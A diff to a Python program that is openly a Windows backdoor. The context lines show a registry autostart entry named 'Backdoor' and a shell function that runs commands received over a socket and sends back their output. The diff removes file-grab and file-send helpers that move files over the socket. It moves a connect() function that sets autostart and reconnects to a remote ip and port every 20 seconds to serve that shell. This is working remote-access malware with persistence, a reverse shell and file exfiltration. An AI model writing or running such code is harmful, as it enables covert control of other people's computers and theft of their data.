@@ -43,45 +43,6 @@ def setAutostart():
             as key:
                 wrg.SetValueEx(key, "Backdoor", 0, wrg.REG_SZ, '"' + executablePath + '"')
 
-def connect():
-    setAutostart()
-    # Trying to connect to server every 20 seconds
-    while True:
-        try:
-            with socket.socket() as mySocket:
-                mySocket.connect((ip, port))
-                shell(mySocket)
-        except:
-            pass
-        time.sleep(20)
-
-def letGrab(mySocket, path):
-    if os.path.exists(path):
-        f = open(path, 'rb')
-        packet = f.read(5000)
-        while len(packet) > 0:
-            mySocket.send(packet)
-            packet = f.read(5000)
-        mySocket.send('DONE'.encode())
-        f.close  # not in instructions
-    else:
-        mySocket.send('File not found'.encode())
-
-def letSend(mySocket, path, fileName):
-    if os.path.exists(path):
-        f = open(path + fileName, 'ab')
-        while True:
-            bits = mySocket.recv(5000)
-            if bits.endswith('DONE'.encode()):
-                # Write those last received bits without the word 'DONE' - 4 characters
-                f.write(bits[:-4])
-                f.close()
-                break
-            if 'File not found'.encode() in bits:
-                f.close()  # not in directions
-                break
-            f.write(bits)
-
 # https://borutzki.github.io/2025/10/16/how-to-check-whether-python-script-has-elevated-privileges.html
 def isAdmin() -> bool:
     if os.name == "nt":
@@ -167,6 +128,18 @@ def shell(mySocket):
                                   stdout = subprocess.PIPE, stderr = subprocess.PIPE)
             mySocket.send(CMD.stderr.read())
             mySocket.send(CMD.stdout.read())
+
+def connect():
+    setAutostart()
+    # Trying to connect to server every 20 seconds
+    while True:
+        try:
+            with socket.socket() as mySocket:
+                mySocket.connect((ip, port))
+                shell(mySocket)
+        except:
+            pass
+        time.sleep(20)
 
 def main():
     connect()
